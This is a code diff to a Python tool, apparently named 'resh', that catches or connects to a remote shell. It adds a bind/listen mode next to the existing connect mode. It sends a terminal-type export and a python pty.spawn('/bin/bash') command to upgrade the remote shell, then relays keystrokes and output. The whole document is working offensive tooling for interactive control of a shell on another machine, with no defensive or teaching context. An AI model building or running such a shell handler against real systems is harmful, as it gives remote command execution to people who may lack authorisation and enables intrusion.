@@ -22,15 +22,15 @@ def recvLoop(sock):
 		try:
 			data = sock.recv(10000000)
 		except OSError:
-			return
+			break
 		except Exception as e:
 			print(e)
 		if data == b'' or data == None:
-			print('end\r\n')
-			return
+			break
 		data = data.decode()
 		data = data.replace('\n', '\r\n')
 		cprint(data)
+	sock.close()
 
 def cprint(data):
 	print(data, end='', flush=True)
@@ -39,6 +39,13 @@ def connect(host, port):
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	sock.connect((host, port))
 	return sock
+
+def bind(port):
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.bind(('', port))
+	sock.listen(1)
+	client, _ = sock.accept()
+	return client
 
 def rc(sock):
 	rc_path = os.path.expanduser('~') + '/.reshrc'
@@ -54,7 +61,15 @@ print('''
 ██║░░██║███████╗██████╔╝██║░░██║
 ╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝
 ''')
-sock = connect(sys.argv[1], int(sys.argv[2]))
+if len(sys.argv) == 2:
+	sock = bind(int(sys.argv[1]))
+elif len(sys.argv) == 3:
+	sock = connect(sys.argv[1], int(sys.argv[2]))
+else:
+	print('''Usage:
+Client: resh [IP] [PORT]
+Server: resh [PORT]''')
+	exit(1)
 
 sock.send(b'export TERM=xterm\n')
 sock.send(b'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n')
@@ -70,13 +85,12 @@ while True:
 		c = '\n'
 	elif c == '²':
 		sock.send(b'exit\n')
-		resetTTY(fd, oldSet)
 		break
 	try:
 		sock.send(c.encode())
 	except BrokenPipeError:
-		resetTTY(fd, oldSet)
 		break
 
+resetTTY(fd, oldSet)
 sock.close()
 thr.join()
